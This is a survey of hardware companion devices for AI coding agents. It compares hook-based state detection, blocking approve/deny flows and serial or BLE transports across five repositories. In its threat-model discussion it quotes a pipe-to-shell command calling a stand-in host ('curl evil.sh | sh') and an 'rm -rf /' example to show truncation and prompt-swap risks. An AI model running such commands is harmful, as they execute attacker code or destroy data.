# Prior art: physical hardware companions for AI coding agents

Read-only survey. No repo was cloned. Everything below was read via `gh api` and
`raw.githubusercontent.com`. Line numbers refer to the files at each repo's
default branch as of 2026-09-07.

Relevance frame for this project: USB-serial only (no WiFi, no BLE, no cloud),
LILYGO T-Display-S3, showing **OpenAI Codex CLI** session state, 2-day deadline.
The two questions that matter are (a) how others solved approve-from-device and
(b) how others detect "waiting on the human".

---

## Part 1: ranked answers to the two questions

### 1a. APPROVE/DENY, ranked by usefulness

| Rank | Project | Can the device actually answer a prompt? | Mechanism in one line |
|---|---|---|---|
| 1 | **Sbr1z/ccdev** | **Yes, for real terminal sessions** | `PermissionRequest` hook blocks on stdout; hook POSTs its own stdin to a local daemon, daemon shows the prompt on the device, tap returns an index, hook prints a `hookSpecificOutput.decision` |
| 2 | **CVSRohit/claude-code-remote** | Yes, but only for sessions **it** started | Agent SDK `canUseTool` callback returns an unresolved Promise; the device's `{"type":"approve"}` message resolves it |
| 3 | **mr-tbot/Atom-Echo-Claude-Code** | No. It fakes a human | Button press injects Ctrl+D / Escape keystrokes into a focused VSCode terminal (or OS-level via pynput) |
| 4 | **leikaiwei/cc_bridge** | No | Notify only, one byte of state over BLE |
| 5 | **chaosmin/claude-traffic-light** | No | Notify only. Its README lists "physical button to approve" as unbuilt idea #4 |

#### Winner: ccdev's blocking-hook pattern (steal this)

This is the only design in the five that answers a permission prompt in a
**normal interactive Claude Code session**, with no SDK and no headless runner.
The whole trick is that a `PermissionRequest` hook is synchronous: Claude Code
blocks on the hook's stdout, so the human round trip can happen inside the hook's
own lifetime.

Flow:

1. `daemon/hooks/settings-snippet.json:141-151` registers the hook with **no
   matcher**, so every prompt is offered to the device, with `"timeout": 310`.

   ```json
   "PermissionRequest": [
     { "hooks": [ { "type": "command", "command": "ccdev ask-hook", "timeout": 310 } ] }
   ]
   ```

2. `daemon/ccdev/ask_hook.py:86-103` reads stdin to EOF first (the comment at
   :84-85 says an unread pipe can wedge Claude Code on Windows), then POSTs the
   raw hook payload to `http://127.0.0.1:8765/ask` with a 310 s timeout.

3. `daemon/ccdev/hooks.py:80-105` (`_do_ask`) holds that HTTP request open while
   the daemon puts the question on the device and waits for a tap. The docstring
   at :81-85 states the contract: "Claude Code's PermissionRequest hook waits on
   our stdout, so the whole round trip to the watch happens inside this one
   request."

4. `daemon/ccdev/__main__.py:409-451` (`on_ask`) queues the prompt, publishes it,
   and blocks on a `concurrent.futures.Future` with a per-step budget
   (`__main__.py:352-353`: `TIMEOUT_S = {"ExitPlanMode": 300}`,
   `DEFAULT_TIMEOUT_S = 120`).

5. The device sends back an **index**, not a label
   (`docs/ble-protocol.md:258-267`): `{"ans":"1:2"}` meaning `qid:index`. The
   host resolves that index against the untruncated `tool_input` it still holds.

6. `daemon/ccdev/ask_hook.py:64-80` turns the index into the decision Claude Code
   acts on:

   ```python
   if tool == "ExitPlanMode":
       if choice == 0: return {"behavior": "allow", "message": "approved from CCDev2"}
       return {"behavior": "deny", "message": "rejected from CCDev2"}
   # Any other tool: Allow / Allow all / Deny
   if choice == 0: return {"behavior": "allow", "message": "allowed from CCDev2"}
   if choice == 1: return {"behavior": "allow", "message": "allowed from CCDev2",
                           "permission_suggestions": [{"tool": tool}]}
   if choice == 2: return {"behavior": "deny", "message": "denied from CCDev2"}
   ```

   wrapped as `{"hookSpecificOutput": {"hookEventName": "PermissionRequest",
   "decision": {...}}}` (`ask_hook.py:28-30`).

Five safety properties in that code that are worth copying verbatim:

- **Every failure path returns "ask", never "deny."** `ask_hook.py:8-12`:
  "When anything at all goes wrong, daemon stopped, device out of range, nobody
  looking at the screen, the answer is 'ask' ... We never auto-deny: silently
  refusing something the user did want is worse than making them walk to the
  keyboard." Implemented as a bare `except Exception: pass` at :101-102 with
  `out = ASK` preset at :87.
- **Two nested timeouts, inner one shorter.** `ask_hook.py:20-22`: the hook's own
  310 s timeout is deliberately longer than the daemon's 300 s ceiling, so the
  daemon's fallback fires first and the hook timeout only ever catches a daemon
  that died mid-prompt.
- **Index stability.** `__main__.py:379-385`: an option with a missing label
  becomes `"?"` rather than being dropped, because "filtering renumbered the
  indices while ask_hook resolved the tap against the unfiltered list, so a tap
  returned the wrong answer."
- **Queue, do not replace.** `__main__.py:270-278`: with several sessions open a
  newer prompt would swap the screen out from under a finger already moving, and
  the tap would carry the new qid and be accepted as valid. They queue instead;
  the head stays on screen until it is answered or times out. Reproduced in their
  own writeup with `Bash: ls` swapped for `Bash: rm -rf /` between the read and
  the tap (`docs/ble-protocol.md`, security section).
- **400 ms tap guard** after drawing a new question (`ASK_TAP_GUARD_MS`, cited in
  `docs/ble-protocol.md` security section).

And the honest limitation they document, which matters more than the mechanism:
their question text budget is 30 bytes, so `Bash: cd /tmp && curl evil.sh | sh`
reaches the screen as `Bash: cd /tmp && curl evil...`. Their own conclusion:
"Approve routine things from the device; walk to the keyboard whenever the text
was cut." A T-Display-S3 at 320x170 has far more room than their 30-byte BLE
payload, so this specific constraint does not bind for us; the lesson (show
enough to make the decision, or refuse to offer it) does.

One flagged-unverified branch: `__main__.py:402-404` and `ask_hook.py:73-75` both
carry a `ponytail:` note saying "Allow all" assumes a hook decision can express a
session-scoped grant via `permission_suggestions`, and that if it cannot, the
branch and the button should be dropped together. Treat "Allow all" as unproven.

#### Runner-up: Agent SDK `canUseTool`

`CVSRohit/claude-code-remote` `bridge/src/server.ts:242-266`:

```ts
const canUseTool = async (toolName, input, { toolUseID, signal }) => {
  send({ type: "tool", name: toolName, summary: summarizeTool(toolName, input),
         id: toolUseID, needsApproval: true });
  const allow = await new Promise<boolean>((resolve) => {
    pending.set(toolUseID, resolve);
    signal.addEventListener("abort", () => resolve(false), { once: true });
  });
  pending.delete(toolUseID);
  return allow ? { behavior: "allow", updatedInput: input }
               : { behavior: "deny", message: "Denied via ESP32 button." };
};
```

The device's reply resolves it at `server.ts:362-365`. The `pending` map is
`toolUseId -> resolver` (`server.ts:192-193`), and it is drained to `false` on
socket close (`server.ts:444-447`) so a hung query can unwind.

Why this is second and not first: it only governs sessions the runner itself
launches from `presets.json` via `query({prompt, options})`. Your own terminal
session is untouched. The README is explicit that this is the point of the design
(`README.md:18-22`): the Agent SDK's `canUseTool` "gives you the physical
approve/deny that the official remote control can't do." For a Codex tool that
attaches to a session the user already started, this shape does not transfer.

They also ship a second mode (`README.md:41-46`, `server.ts:299-305`): `auto`
uses `permissionMode: "bypassPermissions"` plus a `PreToolUse` hook that only
observes, so you see every action without blocking, and the red button becomes an
interrupt (`server.ts:375-389`, `AbortController.abort()`).

#### The keystroke-injection approach (Atom Echo)

Not approval, but worth knowing as the fallback shape. Button press on the device
becomes a WebSocket `trigger` event to exactly one VSCode window
(`docs/PROTOCOL.md`, client push events table), and the extension focuses the
Claude Code terminal and sends Ctrl+D. Without VSCode there is an OS-level
fallback in `daemon/atomecho/keystroke.py:18-44` using pynput, which the module
docstring says does not work on Wayland (:5-6). Gestures map to arbitrary combos
in `config.toml` (`README.md:177-187`), xdotool-style: `press = "ctrl+d"`,
`triplepress = "ctrl+a BackSpace"`, `longpress = "Return"`.

For Codex CLI this is the crude-but-universal path: a "y\n" typed into the right
TTY answers any prompt any agent can raise. It is also the one most likely to
type into the wrong window.

---

### 1b. STATE DETECTION, ranked by usefulness

Every one of the five detects Claude Code, and **none of them detects Codex CLI**.
Four use Claude Code hooks; the fifth (partly) tails transcripts. The
transcript-tailing code is the only piece that ports directly to Codex.

#### The hook matrix, consolidated

`waiting on the human` is derived the same way in all four hook users: the
`Notification` event with a **matcher**.

| Project | Hook | Matcher | Meaning assigned |
|---|---|---|---|
| ccdev | `Notification` | `permission_prompt\|agent_needs_input` | `waiting` (only state that beeps) |
| ccdev | `Notification` | `agent_completed` | `done` |
| ccdev | `Notification` | `idle_prompt\|auth_success` | `notice` |
| cc_bridge | `Notification` | `permission_prompt\|elicitation_dialog` | `confirm` |
| traffic-light | `Notification` | (none) | `WAITING` |
| Atom Echo | `Notification` | (none) | `attention` |

Evidence: `Sbr1z/ccdev` `daemon/hooks/settings-snippet.json:3-31`;
`leikaiwei/cc_bridge` `hooks/hooks.json:19-26`;
`chaosmin/claude-traffic-light` `README.md:60-64`;
`mr-tbot/Atom-Echo-Claude-Code` `daemon/atomecho/hooks.py:25-29`.

The rest of the state signal:

| Event | ccdev | cc_bridge | traffic-light | Atom Echo |
|---|---|---|---|---|
| `SessionStart` | - | `idle` | - | - |
| `UserPromptSubmit` | `working` | `working` | `THINKING` | `working` |
| `PreToolUse` | - | - | `EXECUTING` | - |
| `PostToolUse` | activity hint char (`m=E/B/R`) | `working` | `ERROR` or `THINKING` | - |
| `PostToolUseFailure` | `m=X` | - | - | - |
| `SubagentStart` / `SubagentStop` | `m=A` / `m=.` | `done` on stop | - | - |
| `Stop` | `idle` | `done` | `DONE` | `complete` |
| `StopFailure` | - | `error` | - | - |
| `PreCompact` / `PostCompact` | `m=Z` / `m=.` | - | - | - |
| `SessionEnd` | `gone` (forget session) | `end` | - | - |

Two details in that table are load-bearing and easy to miss:

- **ccdev separates status from activity.** `st` is the session state; `m` is a
  one-character activity hint (`docs/ble-protocol.md:108-111`: `E` edit/write,
  `B` bash, `R` read/search, `A` subagent, `X` tool failed, `L` rate limited,
  `F` auth/billing, `Z` compacting). An unrecognised character falls through to
  "none" on the device, so a newer daemon cannot confuse older firmware. That
  forward-compat rule is worth copying into any serial protocol.
- **traffic-light parses PostToolUse stdin for failure.**
  `scripts/claude_light.py:63-72`:

  ```python
  chunk = sys.stdin.buffer.read(4096)
  if b'"is_error": true' in chunk or b'"is_error":true' in chunk:
      send("ERROR")
  else:
      send("THINKING")
  ```

  A substring check on the first 4 KB, both spacing variants. Crude, cheap, and
  it works. Note ccdev has a real `PostToolUseFailure` event instead
  (`settings-snippet.json:91-100`), which is cleaner if it exists for your agent.

#### Forwarding hook stdin is what makes multi-session work

ccdev's `README.md:134-138` is the single most useful paragraph in the five repos:

> Each one also forwards its own stdin (`--data-binary @-`). That is where Claude
> Code puts `session_id` and `cwd`, and it is what lets the daemon tell several
> open sessions apart, without it the last hook to fire overwrites the rest, and
> one session's `Stop` clears another's alert.

The hook command shape (`settings-snippet.json:8`):

```
curl -s --max-time 2 -X POST "http://127.0.0.1:8765/state?st=waiting" \
  -H "content-type: application/json" --data-binary @-
```

Signal in the **query string**, hook's own stdin as the **body**. The daemon then
reads `session_id` and `cwd` out of the body (`daemon/ccdev/hooks.py:73-76`) and
tolerates an unparseable body without dropping the state change (`hooks.py:26-33`).
`cc_bridge` does the same over a Unix socket
(`bridge/buddyctl.py:47-60`), and additionally uses the presence of `agent_id` to
tell a subagent's `Stop` from the main agent's (`buddyctl.py:48-52`).

#### Folding N sessions into one light

Both multi-session projects fold by urgency, not by recency.

- ccdev (`docs/ble-protocol.md:69-75`): `waiting > done > notice > working > idle`.
  "That ordering is what stops a `Stop` in one session from clearing another
  session's alert." Sessions that die without `SessionEnd` are dropped after 30
  minutes of silence.
- cc_bridge (`bridge/protocol.py:7-12`): the state code **is** the priority.
  `IDLE=0, DONE=1, WORKING=2, CONFIRM=3, ERROR=4`, and `aggregate()` returns
  `max()` over live sessions (`bridge/bridge.py:106-130`).

#### The decay problem, and cc_bridge's answer to it

Hooks fire on transitions, not continuously, so a long single tool call produces
no events and the light sticks. cc_bridge's `config.py:22-31` (translated) is the
clearest statement of the tradeoff I found anywhere:

- `WORKING_DECAY = 10 * 60`: if `working` has not been refreshed in 10 minutes,
  demote it to `done`. The threshold only needs to cover the longest gap
  **between** two hook fires (that is, one tool call's duration), not the whole
  turn. It covers Esc-interrupt, subagent end, terminal killed, and out-of-order
  async hooks.
- `SESSION_TTL = 30 * 60` zombie cleanup, `DONE_DECAY = 30 * 60`,
  `IDLE_EXIT = 60 * 60` daemon self-exit.
- Their comment admits the residual: a single tool that runs longer than 10
  minutes gets misjudged until it reports, and "tuning the threshold can only
  shrink the misjudgement, not remove it," because hooks fire on completion with
  no heartbeat during execution.

ccdev does this host-side too: `done` decays after 20 s and `notice` after 12 s
(`docs/ble-protocol.md:59-62`), and "a usage-poll error will not overwrite them,
because losing the network is no reason to wipe a checkmark."

cc_bridge also persists the session table to disk with wall-clock timestamps and
converts back to monotonic on load (`bridge/bridge.py:61-90`), specifically so a
daemon restart during an unanswered `confirm` does not blank the light.

#### The Codex-relevant one: transcript tailing

`CVSRohit/claude-code-remote` has a second, hookless path. `bridge/src/server.ts`:

- `listLocalSessions()` at :81-121 scans `~/.claude/projects/*/*.jsonl`, skips
  `agent-*` files (subagent transcripts), sorts by mtime, and reads the first
  16 KB of each to pull `cwd` and the first user message as a label.
- `startMonitor()` at :173-181 opens at `size - 8000` and polls every 700 ms.
- `pumpMonitor()` at :157-171 stats the file, reads only the new byte range, and
  parses line by line. Byte-offset tailing, not a line count.
- `fmtEntry()` at :124-144 renders each JSONL record: user text prefixed `> `,
  assistant text as-is, `tool_use` blocks as `[Name] summary`, and returns
  `null` for `tool_result` records so they do not spam the screen.

This is the shape that transfers to Codex CLI rollout files. It is read-only by
construction: it can show you what is happening but cannot answer anything.
(Codex does in fact have a hook system, verified in Part 5, so transcript tailing
is the fallback here rather than the only option.)

---

## Part 2: per-repo detail

### CVSRohit/claude-code-remote

Physical remote (ESP32 + ST7789 240x240 + 4 buttons) via a Fly.io relay and the
Claude Agent SDK. 0 stars, license MIT (`LICENSE:1-8`, and the grant explicitly
extends to "the associated hardware design files"). Last push 2026-06-13.

**1. Transport.** WiFi to a WebSocket cloud relay on Fly.io, TLS. Three parts:
`relay/` (Fly.io), `bridge/` (runner on your PC), `firmware/` (ESP32). Reason
given, `README.md:18-22`: Claude Code cannot run on an ESP32, so the ESP32 is a
thin client; this "mirrors Claude Code's own Remote Control model, the machine
that owns the files dials outbound to a relay, nothing inbound." Runner and device
both dial out; the relay is stateless and "holds no API key and no files"
(`relay/server.js:12`). Pairing is one shared bearer token
(`README.md:52-56`, `relay/server.js:39-41`). Multi-runner, multi-session: the
relay merges each runner's session list and the device selects
`<runnerId>:<sessionRef>` (`relay/server.js:14-33`).

**2. State detection.** Two modes. For sessions it launches, state comes from the
Agent SDK message stream directly (`server.ts:308-335`: `system/init`,
`assistant` text blocks, `result`). For sessions it did not launch, transcript
tailing as described above. No settings.json hooks at all for the user's own
sessions; the only hook used is an in-process SDK `PreToolUse` observer in auto
mode (`server.ts:269-281, 304`).

**3. Approve/deny.** Yes, via `canUseTool` (detailed in Part 1a). Device side:
`firmware/src/main.cpp:379-385` sets `ST_APPROVAL` when a `tool` message carries
`needsApproval`, and :453-462 sends `{"type":"approve","id":pendingToolId,"allow":bool}`.

**4. State model.** Firmware screens (`main.cpp:15-21`): `ST_BOOT`,
`ST_SESSIONS`, `ST_MENU`, `ST_RUNNING`, `ST_APPROVAL`, `ST_MONITOR`, `ST_RESULT`.
Wire states are `idle | thinking | running | busy` (`server.ts:23`). No
animations; it is a text UI with a scrollable log buffer and auto-follow
(`README.md:150-152`). Backlight sleeps after 60 s and wakes on any button or an
incoming approval (`README.md:110-112`, `main.cpp:491-...`).

**5. Trust/setup friction.** Highest of the five. Requires: a Fly.io account and
`fly deploy`; Node 18+ and an authenticated Claude Code on the PC; WiFi SSID and
password compiled into `firmware/include/secrets.h`; a shared token in three
places. `README.md:134-139` concedes that in auto mode the runner uses
`bypassPermissions`, "so treat the token like a key to your shell."

**6. License.** MIT, reusable, including the OpenSCAD case source and STLs.

**7. Right / wrong.**
- Right: one meaning per button everywhere (`main.cpp:10-13`: up/down always move,
  green always affirmative, red always negative). Right: `summarizeTool()`
  (`server.ts:219-240`) is a per-tool one-line renderer, exactly what a small
  screen needs, and it is reused for both live approval and transcript rendering.
  Right: red button is context-sensitive but always negative (deny, interrupt,
  back), so there is no mode confusion.
- Wrong for our purposes: the cloud relay and the SDK-runner model mean it can
  only govern sessions it started. Also `presets.json:2` ships an absolute
  Windows path as `defaultCwd`, and the whole prompt vocabulary is five canned
  presets, so it is a launcher more than a companion.

### Sbr1z/ccdev

Waveshare ESP32-S3-Touch-LCD-1.46 (412x412 round touch) desk companion. 0 stars,
**no license file** (`gh api repos/Sbr1z/ccdev` returns `license: null`). Last
push 2026-08-12. This is the most carefully engineered of the five by a wide
margin, and also the one you cannot legally copy code from.

**1. Transport.** BLE. Device is the GATT **server**, host daemon is the central.
Reason stated at `docs/ble-protocol.md:5-10`: "bleak, the Python BLE library,
cannot act as a peripheral on Windows or macOS. Only the central role is
portable, so the host takes it." Nordic UART base UUID reused, MTU 185 requested,
one write characteristic (host to device) and one notify (device to host)
(`ble-protocol.md:23-26`).

**2. State detection.** Full hook matrix (see Part 1b) plus two extras:

- **A statusline wrapper** for context-window percentage, because "Hooks carry no
  context-window data; the statusline JSON is the only place Claude Code exposes
  it" (`README.md:150-155`). `ccdev install-statusline` *wraps* the existing
  statusline rather than replacing it: the original is stashed in
  `statusLine.ccdevWrapped`, run on the same stdin, and its output reprinted
  verbatim.
- **Usage polling**: the daemon polls `api.anthropic.com` every 60 s and reads
  `anthropic-ratelimit-unified-5h-utilization` and the 7d equivalent
  (`README.md:204-208`). The OAuth token never leaves the host (`README.md:15-16`).

**3. Approve/deny.** Yes. See Part 1a. This is the reference implementation.

**4. State model.** Six states (`daemon/ccdev/state.py:12`):
`("idle", "working", "waiting", "done", "notice", "error")`. Presentation
(`README.md:30-40`): `waiting` = red text, flashing ring, **beep**;
`done` = big green tick for 20 s, silent; `notice` = amber text for 12 s, silent;
`working`/`idle` = plain text. Their rule, stated twice: "Only `waiting` makes a
sound. The rest are worth a glance, not an interruption." Tapping the screen
acknowledges and stops the flashing, and deliberately does **not** change the
status, because doing so made the alert re-fire and beep repeatedly
(`ble-protocol.md:251-254`).

Three screens, swipe between them: a blinking mascot face, a dual-arc usage
gauge, and a detail screen. The mascot has an 18-rung mood chain
(`ble-protocol.md:155-170`) driven by context percentage, usage percentage, and
the activity hint. Screen stays on permanently, justified at `README.md:42-44`:
"the device is USB-powered, so there is no battery to save and nothing to nudge
awake before you can read it."

**5. Trust/setup friction.** Lowest of the five, deliberately. The daemon ships as
a single PyInstaller executable so the target machine needs no Python
(`README.md:46-52`). No WiFi credentials, no cloud account, no token on the wire.
`ccdev install` merges hooks with a timestamped backup, is idempotent, and
"refuses to touch a file it cannot parse" (`README.md:126-128`). `ccdev doctor`
diagnoses credentials, API, port, hooks and device, and is pitched as the first
thing to run "on a machine you cannot debug over serial" (`README.md:61-64`).
They are honest that macOS and Linux autostart paths were written but never run
(`README.md:80-88`).

**6. License.** None. Do not copy code. Read it for the design.

**7. Right / wrong.**
- Right: the whole blocking-hook approve path, plus the fail-open-to-"ask" rule.
- Right: send an **index**, resolve the label host-side. What the small screen had
  to truncate never becomes what the agent acts on (`ble-protocol.md:262-264`).
- Right: **UI keys off `qid`, never off status** (`ble-protocol.md:190-192`). The
  host keeps re-asserting `waiting` while the agent is blocked, so a heartbeat
  carrying the same `qid` must not re-alert; only a new `qid` does. This is the
  fix for the classic "it beeps every heartbeat" bug.
- Right: 10 s heartbeat, and the device shows `N/A` if nothing arrives for 45 s
  (`README.md:189-192`), so a dead daemon never leaves a stale number on screen.
- Right: refuses to start a second daemon rather than silently failing to bind
  (`daemon/ccdev/hooks.py:113-121`), and turns off `SO_REUSEADDR` to make that
  check actually fire on Windows (`hooks.py:128-135`).
- Right: `ThreadingHTTPServer` because a blocking `/ask` would otherwise stall
  every `/state` POST behind it, and those run with `--max-time 2` so they would
  give up and freeze the screen (`hooks.py:123-127`). There is a regression test
  for exactly this at `hooks.py:252-263`.
- Right: an explicit written threat model that concludes the risk is real and
  accepted, naming the truncation as the sharper everyday risk than any attacker.
- Wrong: no license. Wrong: 180-byte payload cap forces a 30-byte question
  budget, which is the source of their worst risk; they say so themselves. Wrong
  (their own note): the Ask screen is built to name the session but the label
  never fits alongside the question, so that branch of the UI is unreachable.
- Watch out: Windows caches the GATT table per BLE address across firmware
  flashes, uncleared by unpairing or `use_cached_services=False`. Their fix was
  to rename the device, which is why it is `CCDev2` (`README.md:194-201`). Not
  our problem on USB serial, but the same class of bug exists with cached
  descriptors.

### chaosmin/claude-traffic-light

ESP32-S3 traffic light (3 LEDs + onboard NeoPixel). 0 stars, **no license**. Last
push 2026-08-13. Smallest and simplest of the five, and it contains the only USB
serial code in the set.

**1. Transport.** Two implementations in the repo, and only one is documented:

- **Shipped path: WiFi HTTP.** `scripts/claude_light.py:51-60` does
  `GET http://<host>/cmd?state=<STATE>` with a 1 s timeout. mDNS hostname
  `esp32-traffic-light.local`, with a resolved-IP cache in `/tmp` and a 3600 s TTL
  (`claude_light.py:26-48`), because "getaddrinfo runs before the socket timeout
  applies" so an unreachable mDNS name would hang past the timeout. On any
  failure it deletes the cache so the next call re-resolves. WiFiManager captive
  portal for first-boot provisioning (`README.md:31-34`).
- **Vestigial path: USB serial daemon.** `scripts/claude_light_daemon.py` is not
  referenced by the README's setup at all, but it is the most directly relevant
  file in this entire survey for a USB-serial build. It:
  - keeps the port open permanently "to avoid CH340 reset-on-connect" (:3),
  - autodetects the port by globbing `/dev/cu.usbserial*`, `/dev/cu.usbmodem*`,
    `/dev/ttyUSB*`, `/dev/ttyACM*` in that order, with a `CLAUDE_LIGHT_PORT`
    override (:28-35),
  - opens with `dsrdtr=False, rtscts=False` then explicitly sets `ser.dtr = False`
    and `ser.rts = False` and sleeps 1.5 s for the board to boot (:50-53),
  - writes newline-terminated uppercase words at 115200 (:61-62),
  - fronts it with a Unix socket at `/tmp/claude_light.sock`, chmod 0600, so the
    per-hook client is a fire-and-forget one-shot (:80-107),
  - requeues the command and reconnects on write error (:64-67).

  That is the exact architecture a USB-serial Codex display needs, and it is 114
  lines. Its one gap: `VALID_CMDS` at :25 omits `WAITING`, so the serial path
  cannot express the state we care most about. The WiFi path does support it.

**2. State detection.** Hooks calling a Python one-shot per event
(`README.md:40-72`). `Notification` with no matcher maps to `WAITING`.
`PostToolUse` uses the stdin `is_error` substring check quoted in Part 1b.

**3. Approve/deny.** No. `README.md:106` lists it as future idea #4: "Physical
button to approve action, a button wired to a new HTTP endpoint that Claude Code
or a companion script polls, to physically approve a pending permission prompt
during WAITING." Polling is the wrong shape; the blocking-hook pattern is better
and already exists.

**4. State model.** Six (`README.md:7-16`): `THINKING` (chase animation red to
yellow to green), `EXECUTING` (yellow solid), `DONE` (green solid, auto-reverts
to IDLE after 60 s **on the device**), `ERROR` (red solid), `WAITING` (onboard
blue NeoPixel as an **overlay**, main LEDs untouched), `IDLE` (all off).

The overlay idea is the good one here: `WAITING` does not destroy the underlying
state, so when you answer, the light is still showing what the agent was doing.

**5. Trust/setup friction.** WiFi credentials via a captive portal on first boot,
plus hand-editing `settings.json` with absolute paths to the repo. Arduino IDE
plus two libraries. No cloud, no accounts.

**6. License.** None. Do not copy code.

**7. Right / wrong.**
- Right: `WAITING` as a non-destructive overlay on a separate light.
- Right: device-side auto-revert of `DONE` after 60 s, so a missed transition
  self-heals without the host.
- Right: the mDNS IP cache with invalidate-on-failure, and the reasoning about
  `getaddrinfo` ignoring the socket timeout.
- Right (the serial daemon): hold the port open, kill DTR/RTS, front it with a
  socket.
- Wrong: spawning a fresh `python3` per hook event, which is 30 to 80 ms of
  interpreter startup on every tool call. `cc_bridge` has the same flaw;
  ccdev and Atom Echo avoid it by making the hook a bare `curl`.
- Wrong: the serial daemon is undocumented, unwired, and missing `WAITING`, so
  the better transport is dead code in its own repo.

### mr-tbot/Atom-Echo-Claude-Code

M5Stack Atom Echo ($15, ESP32-PICO-D4, PDM mic, I2S speaker, one RGB LED, one
button) as push-to-talk mic, chime notifier and state LED. 0 stars, **MIT**
(`LICENSE`), last push 2026-07-19. The only audio-first project in the set.

**1. Transport.** WiFi WebSocket, LAN only. Device to daemon on port 17845 bound
`0.0.0.0`; daemon's control API on 17846 bound `127.0.0.1`
(`docs/PROTOCOL.md`, topology section). Discovery by mDNS
`_atomecho-claude._tcp`, "preferring same-subnet answers", alternating with a
provisioned static host so a stale mDNS answer cannot wedge it
(`README.md:198-200`). No cloud; for WAN they explicitly say do not port-forward
and recommend Tailscale or an SSH tunnel (`README.md:150-157`).

**2. State detection.** Three hooks only (`daemon/atomecho/hooks.py:25-29`):
`Stop` to `complete`, `Notification` to `attention`, `UserPromptSubmit` to
`working`. Hook command (`hooks.py:14-18`):

```
curl -s -m 2 -X POST -H 'X-AtomEcho: 1' http://127.0.0.1:17846/event/<event> \
  >/dev/null 2>&1 || true  # atom-echo-claude
```

Note the trailing `|| true` and the `# atom-echo-claude` marker comment, which is
also how uninstall finds its own entries (`hooks.py:74`). No session
multiplexing: the last hook to fire wins.

**3. Approve/deny.** No, and see Part 1a for the keystroke fallback it uses
instead.

**4. State model.** Four semantic LED states over the wire
(`docs/PROTOCOL.md`, daemon-to-device table):
`{"t":"led","state":"ready"|"working"|"attention"|"error"}`, plus a raw override
form `{"t":"led","rgb":[0,255,0],"mode":"solid"|"pulse"|"off"}`. Rendered as
(`README.md:28-29`): green solid ready, blue breathing working, yellow pulse
needs input, red pulse error/disconnected, magenta mic live, orange booting.
Chimes are separate from LED state and are named, not sampled:
`{"t":"chime","name":"complete"|"attention"|"error"|"connect"}` with a custom
`tone` form taking up to 32 notes.

**5. Trust/setup friction.** Moderate. WiFi SSID and PSK provisioned over USB
(`atomecho provision --ssid ... --psk ...`), a Python venv, platform-specific
audio plumbing (PipeWire on Linux, BlackHole on macOS, VB-Cable on Windows), and
a VSCode extension `.vsix` for the button path. No cloud accounts.

**6. License.** MIT. Reusable.

**7. Right / wrong.**
- Right: the security notes at `README.md:231-244` are the best in the set for a
  LAN service. A daemon-generated shared token written to the device by the
  provisioner, so a LAN peer cannot impersonate the device or start the mic by
  spoofing mDNS. A **CSRF header** requirement (`X-AtomEcho: 1`) on all
  state-changing local API calls, so a web page you visit cannot poke
  `127.0.0.1:17846` and turn on your microphone. This one applies directly to any
  localhost daemon, including ours.
- Right: "Streaming is daemon-authoritative. Button press: device only reports it;
  daemon decides." The device is dumb and the host owns policy. Same principle as
  ccdev's index-not-label.
- Right: gesture vocabulary from one button (press / double / triple / long,
  resolved 400 ms after the last release), each mappable to an arbitrary key
  combo. That is a lot of affordance from one button, and the T-Display-S3's two
  buttons could carry the same scheme.
- Right: machine-scoping the sensitive VSCode settings so a cloned repo's
  workspace settings cannot make the extension execute arbitrary commands.
- Wrong: three hooks and no session identity, so multiple sessions stomp each
  other. Wrong: the keystroke path is inherently fragile (needs a terminal named
  like "claude", does not work on Wayland, and can type into the wrong window).

### leikaiwei/cc_bridge

BLE RGB light. Chinese-language README. 0 stars, **no license**. Last push
2026-08-11. Distributed as a Claude Code **plugin** via a marketplace, which is
the most frictionless install in the set.

**1. Transport.** BLE, one byte. `bridge/protocol.py:26-29` hardcodes the device
name `cc-bridge-kelvin` and both UUIDs on both ends. The host writes a single
state code and "colours and animations are decided by the firmware"
(`protocol.py:3-4`, `README.md:25`). `bleak` central, long-lived connection with
exponential backoff capped at 30 s (`bridge/bridge.py:140-155`), rediscovery by
name then by service UUID (`bridge.py:157-166`), and a 200 ms poll that writes
only on change (`bridge.py:175-182`).

**2. State detection.** Hooks to a Unix socket (see Part 1b). Architecture is
worth noting for a USB build because it is the same shape: a fire-and-forget
stdlib-only client per hook (`bridge/buddyctl.py`), a single long-lived daemon
holding the hardware link, `flock` for singleton (`bridge.py:32-42`), lazy
autostart on the first hook, and self-exit after 60 minutes idle.

**3. Approve/deny.** No. `confirm` is a yellow flashing light and nothing more.

**4. State model.** Five, code = priority (`bridge/protocol.py:7-12`):
`idle` warm white solid, `done` green solid, `working` Claude-orange breathing,
`confirm` yellow flashing, `error` red slow pulse (latched until the next
`working`).

**5. Trust/setup friction.** `claude plugin marketplace add leikaiwei/cc_bridge`
then `claude plugin install`, and the first session auto-runs `uv sync`. No WiFi
credentials (BLE), no cloud. One large platform-specific wart: on macOS a bare
Python process touching Bluetooth is killed by TCC with no prompt, so the daemon
is packaged into a minimal signed `CC Bridge.app` built at
`~/.cc-bridge/CCBridge.app` on first run and launched via LaunchServices, which
requires Xcode Command Line Tools for `clang` and `codesign`
(`README.md:56-63`). USB serial has no equivalent permission gate on macOS, which
is a real argument for our transport choice.

**6. License.** None. Do not copy code.

**7. Right / wrong.**
- Right: state code **is** the priority integer, so `max()` is the entire
  aggregation function. One byte on the wire, all presentation in firmware.
- Right: `WORKING_DECAY` and the honest comment about why hooks cannot give you a
  heartbeat during a long tool call.
- Right: persisting the session table with wall-clock timestamps and converting
  back to monotonic on load, so a daemon upgrade mid-`confirm` does not lose the
  alert (`bridge.py:44-90`).
- Right: `agent_id` presence distinguishes a subagent's `Stop` from the main
  agent's (`buddyctl.py:48-52`).
- Right: `async: true` on every hook entry (`hooks/hooks.json`), so no hook can
  block the terminal.
- Wrong: `python3` process per hook event. Wrong: no license. Wrong: firmware
  lives in a separate private repo, so the published half does not build.

---

## Part 3: the wider field (search sweep)

`gh search repos` across ten phrasings ("esp32 claude code", "claude code
hardware", "agent status light esp32", "claude code notifier device", "coding
agent display esp32", "ai coding agent hardware companion", "claude code
companion device", and variants). This is a much larger genre than the five
listed, and several entries answer our two questions better than the five do.

Most relevant misses, by stars:

| Stars | Repo | Why it matters here |
|---|---|---|
| 2152 | `HermannBjorgvin/Clawdmeter` | ESP32 desk dashboard for Claude Code usage. The genre's anchor project |
| 257 | `JasonLam08/cursor_agent_status_light` | BLE status light for **Cursor** agent, ESP32-C3. Non-Claude agent detection |
| 225 | `puritysb/AgentDeck` | "Physical controller & multi-surface dashboard", Stream Deck+, Android, iOS/macOS, ESP32 |
